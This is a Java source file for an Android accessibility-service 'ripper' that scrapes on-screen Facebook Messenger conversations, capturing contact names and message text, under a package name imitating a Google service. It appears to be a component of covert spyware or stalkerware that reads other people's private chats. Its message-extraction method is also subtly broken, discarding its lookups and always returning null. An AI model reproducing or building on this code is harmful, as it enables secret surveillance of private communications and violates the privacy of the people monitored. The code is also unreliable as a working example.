package service.android.google.com.accessibility.util.ripper.rippers;

import android.view.View;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

import service.android.google.com.accessibility.model.ChatEvent;
import service.android.google.com.accessibility.model.ChatMessage;
import service.android.google.com.accessibility.model.PackageConstants;

/**
 * Ripper for Messenger.
 * Rips the visible messages on screen.
 * https://play.google.com/store/apps/details?id=com.facebook.orca
 */
public class MessengerRipper extends AbstractChatWindowRipper {

    //<editor-fold desc="Resource IDS">
    /**
     * {@link View} containing the contact information
     */
    public static final String CONTACT_NAME_RES_ID = "thread_title_name";

    /**
     * {@link LinearLayout} containing views that display different type of messages
     * Text, Video, Audio, Giphy, ...
     */
    public static final String MESSAGE_CONTAINER_RES_ID = "message_container";

    /**
     * {@link TextView} containing solely the text
     */
    public static final String MESSAGE_TEXT_RES_ID = "message_text";

    /**
     * {@link View} that show the contact profile picture
     */
    public static final String MESSAGE_USER_TILE_RES_ID = "message_user_tile";

    /**
     * {@link RelativeLayout} that contains the preview image (inline_video_cover_image) the button
     * for video playback (button_camera_video_play) and the video length (inline_video_status)
     */
    public static final String MESSAGE_VIDEO_RES_ID = "message_video";

    /**
     * {@link ImageView} containing the third party app logo. ex.: Giphy
     */
    public static final String MESSAGE_THIRD_PARTY_RES_ID = "app_icon";
    //</editor-fold>

    public MessengerRipper() {
        super(PackageConstants.APP_MESSENGER);
    }

    @Override
    public ChatEvent getWindowInfoEventFromAccessibilityNodeInfo(final AccessibilityNodeInfo nodeInfo) {
        final ChatEvent.Builder builder = ChatEvent.builder()
                .packageName(nodeInfo.getPackageName().toString());

        final List<AccessibilityNodeInfo> contact_name = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResID(CONTACT_NAME_RES_ID));
        if (contact_name.size() < 1) {
            return null;
        }

        final String contactName = contact_name.get(0).getContentDescription().toString();
        this.contactPerson = getContactPersonFromName(contactName);

        return scrapeChatMessages(builder, nodeInfo);
    }

    private ChatEvent scrapeChatMessages(final ChatEvent.Builder unfinishedBuilder,
                                         final AccessibilityNodeInfo nodeInfo) {
        final List<AccessibilityNodeInfo> message_text_containers = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_CONTAINER_RES_ID));
        if (message_text_containers.size() < 1) {
            return null;
        }

        final List<ChatMessage> messages = getChatMessagesFromMessageContainer(message_text_containers);
        if (messages == null || messages.size() < 1) {
            return null;
        }

        return unfinishedBuilder
                .messages(messages)
                .build();
    }

    private List<ChatMessage> getChatMessagesFromMessageContainer(final List<AccessibilityNodeInfo> message_text_containers) {
        List<ChatMessage> chatMessages = new ArrayList<>();
        for (final AccessibilityNodeInfo message_container : message_text_containers) {
            final boolean contactPersonMessages = isMessageFromContactPerson(message_container);
            final String stringifyMessage = getTextFromMessageContainer(message_container);

            if (stringifyMessage == null) {
                return null;
            }

            chatMessages.add(ChatMessage.builder()
                    .text(stringifyMessage)
                    .person(contactPersonMessages ? contactPerson : you)
                    .build());
        }
        return chatMessages;
    }

    private boolean isMessageFromContactPerson(final AccessibilityNodeInfo message_container) {
        return message_container.findAccessibilityNodeInfosByText(MESSAGE_USER_TILE_RES_ID).size() >= 1;
    }

    private String getTextFromMessageContainer(final AccessibilityNodeInfo message_container) {
        final MessageType typeOfMessage = determineTypeOfMessage(message_container);

        switch (typeOfMessage) {
            case TEXT:
                message_container.findAccessibilityNodeInfosByText(MESSAGE_TEXT_RES_ID).get(0);
                break;
            case VIDEO:
                message_container.findAccessibilityNodeInfosByText(MESSAGE_VIDEO_RES_ID).get(0);
                break;
            case THIRD_PARTY:
                message_container.findAccessibilityNodeInfosByText(MESSAGE_THIRD_PARTY_RES_ID).get(0);
                break;
            case UNKNOWN:
                return null;

        }
        return null;
    }

    private MessageType determineTypeOfMessage(final AccessibilityNodeInfo message_container) {
        if (message_container.findAccessibilityNodeInfosByText(MESSAGE_TEXT_RES_ID).size() >= 1) {
            return MessageType.TEXT;
        }

        if (message_container.findAccessibilityNodeInfosByText(MESSAGE_VIDEO_RES_ID).size() >= 1) {
            return MessageType.VIDEO;
        }

        if (message_container.findAccessibilityNodeInfosByText(MESSAGE_THIRD_PARTY_RES_ID).size() >= 1) {
            return MessageType.THIRD_PARTY;
        }

        return MessageType.UNKNOWN;
    }

    enum MessageType {
        UNKNOWN,
        TEXT,
        VIDEO,
        THIRD_PARTY
    }
}